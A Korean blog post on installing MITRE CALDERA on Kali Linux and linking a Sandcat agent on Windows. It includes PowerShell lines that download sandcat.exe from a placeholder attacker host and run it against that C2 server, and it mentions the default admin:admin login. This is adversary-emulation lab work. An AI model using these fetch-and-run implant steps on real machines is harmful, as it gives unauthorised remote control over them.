---
title: '[Pentest] CALDERA 설치 및 Agent 연동'
date: 2025-09-23 00:00:00
categories: [Pentest]
tags: []
published: True
---


# #Set-up

> Environment: <br>
> OS: Kali Linux 2025.2
{: .prompt-info }

<br>

1. Git clone

    ```bash
    git clone https://github.com/mitre/caldera.git --recursive
    ```

2. Python 가상환경 설정

    ```bash
    cd caldera
    python3 -m venv venv
    source venv/bin/activate
    ```

3. requirements 설치

    ```bash
    pip3 install -r requirements.txt
    ```

4. 빌드를 위한 npm 설치

    ```bash
    sudo apt install npm nodejs
    ```


5. Caldera 빌드 및 실행

    ```bash
    python server.py --insecure --build
    ```

6. (Optional) 패키지 설치 오류 해결

    업그레이드된 Kali Linux에서는 Python 3.13을 사용하는데 caldera는 Python 3.12까지 지원한다.

    참고: [https://github.com/mitre/caldera/issues/3154](https://github.com/mitre/caldera/issues/3154)

    <br>

    ```bash
    # Install deps
    sudo apt-get install -y build-essential libssl-dev zlib1g-dev libbz2-dev \
        libreadline-dev libsqlite3-dev libncurses5-dev libffi-dev \
        liblzma-dev libgdbm-dev libnss3-dev curl git
    ```

    <br>

    ```bash
    # Install pyenv
    curl -fsSL https://pyenv.run | bash
    ```

    <br>

    ```bash
    # Add to shell init
    echo 'export PATH="$HOME/.pyenv/bin:$PATH"' >> ~/.zshrc
    echo 'eval "$(pyenv init -)"' >> ~/.zshrc
    echo 'eval "$(pyenv virtualenv-init -)"' >> ~/.zshrc
    exec $SHELL
    ```
    <br>

    ```bash
    # Install Python 3.11
    pyenv install 3.11.9
    pyenv virtualenv 3.11.9 caldera-env

    # (쉘 다시 실행)

    pyenv activate caldera-env
    pip install -r requirements.txt
    python server.py --insecure
    ```

<br>

<br>

# #Execute

CALDERA는 기본적으로 `localhost:8888`에서 실행되고, 기본 계정은 `admin:admin`이다.

<br>

![image](/assets/posts/250923-1.png)

![image](/assets/posts/250923-2.png)

<br>

<br>

# #Agent 연동

> Environment: <br>
> OS: Windows 10
> IP:
{: .prompt-info }

<br>

## 연동 방법 (1) - Sandcat 수동 컴파일

1. (Kali) 기존 sandcat 제거 후 재클론

    ```bash
    rm -rf plugins/sandcat
    git clone https://github.com/mitre/sandcat.git plugins/sandcat
    ```

2. Go 설치

    ```bash
    sudo apt update
    sudo apt install golang-go
    ```

3. Windows용 sandcat 수동 컴파일

    ```bash
    cd plugins/sandcat
    GOOS=windows GOARCH=amd64 go build -o sandcat.exe sandcat.go
    ```

4. sandcat.exe 생성 여부 확인

    ```bash
    ls -l sandcat.exe
    ```

5. 임시 웹 서버 실행

    ```bash
    python -m http.server 9999
    ```

6.  (Windows) sandcat.exe 다운로드

    ```powershell
    Invoke-WebRequest -Uri http://<Kali_IP>:9999/sandcat.exe -OutFile C:\Users\Public\sandcat.exe
    ```

6. Agent 연결

    ```powershell
    cd C:\Users\Public
    .\sandcat.exe -server http://<Kali_IP>:9999 -group red
    ```

<br>

<br>

## 연동 방법 (2) - caldera web에서 설정

1. (Windows) 웹 브라우저에서 `<Kali_IP>:8888` 접속


2. CAMPAIGNS 메뉴 > agents > Deploy an agent 버튼 클릭


3. sandcat 탭 선택 후, Windows 탭 선택

4. app.contact.http 값을 Kali IP로 변경 후, 생성되는 PowerShell 스크립트 복사

5. PowerShellISE에서 복사한 스크립트 붙여넣기 후 실행

<br>

![image](/assets/posts/250923-3.png)
